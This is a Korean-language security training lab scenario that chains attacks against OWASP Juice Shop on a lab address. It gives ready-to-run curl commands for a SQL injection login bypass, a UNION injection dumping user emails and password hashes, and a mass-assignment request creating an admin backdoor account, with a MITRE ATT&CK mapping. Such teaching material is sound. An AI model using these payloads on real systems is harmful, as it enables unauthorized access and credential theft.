    [복합 시나리오] "Exploitation chain — SQLi 인증 우회 + UNION DB 추출 + Mass Assignment 권한 상승"

    ## 상황 (w03 → w04 시나리오 연속)

    > 선임: "정찰 끝났으면 익스플로잇. 한 취약점만 쓰면 의미 없어 — *chain* 이 진짜야.
    > SQLi 로 admin JWT 획득 → UNION 으로 DB 스키마 추출 → Mass Assignment 로 새 admin 계정 생성.
    > MITRE ATT&CK 매핑까지 해서 보고서 차별화."

    학습 목표 (lecture #2·#3·#4 SQLi 4 유형 + JuiceShop 실 공격 + sqlmap) + (lab #1·#5·#4 SQLi auth/UNION/Mass) 통합.

    ## 임무 (3 단계, 약 35분)

    ### Phase A — SQLi 인증 우회 + JWT 분석 (lab #1·#2)
    1) `curl -s -X POST -H "Content-Type: application/json"
        -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"x"}' http://10.20.30.80:3000/rest/user/login`
       응답에서 JWT 캡처 (또는 차단 응답).
    2) JWT decode: `echo "<JWT>" | cut -d. -f2 | base64 -d 2>/dev/null` 로 admin role 확인.

    ### Phase B — UNION SQLi DB 추출 + Mass Assignment (lab #5·#4)
    1) UNION:
       `curl -s "http://10.20.30.80:3000/rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,email,password,role,createdAt,updatedAt,deletedAt%20FROM%20Users--" | head -c 500`
       응답에서 사용자 이메일·해시 추출 (또는 차단 응답).
    2) Mass Assignment:
       `curl -s -i -X POST -H "Content-Type: application/json"
        -d '{"email":"chain'$(date +%s)'@x.com","password":"Test1234!","role":"admin","isAdmin":true}'
        http://10.20.30.80:3000/api/Users/`
       응답 status + 등록 결과 캡처.

    ### Phase C — ATT&CK Initial Access + Privilege Escalation 매트릭스
    | ATT&CK 기법 | 단계 | 사용 페이로드 | 결과 |
    | T1190 Exploit Public-Facing | Initial Access | ' OR 1=1-- | admin JWT 또는 차단 |
    | T1078 Valid Accounts | Initial Access | UNION → email/hash 추출 | 자격증명 풀 확보 |
    | T1068 Exploitation for Priv Esc | Privilege Escalation | __proto__ / role:admin | admin 계정 등록 시도 |
    | T1136 Create Account | Persistence | mass assignment | 백도어 계정 |
    | T1213 Data from Information Repositories | Collection | UNION DB 추출 | 사용자 N명 dump |
    표 끝 "다음 주차 (w05) 입력: 획득한 admin JWT → 권한 상승 후 횡적 이동 (lateral movement) 단계." 한 줄.

    종료: echo "=== Phase A SQLi+JWT ===" / "=== Phase B UNION+Mass ===" / "=== Phase C ATT&CK ===" 묶음.
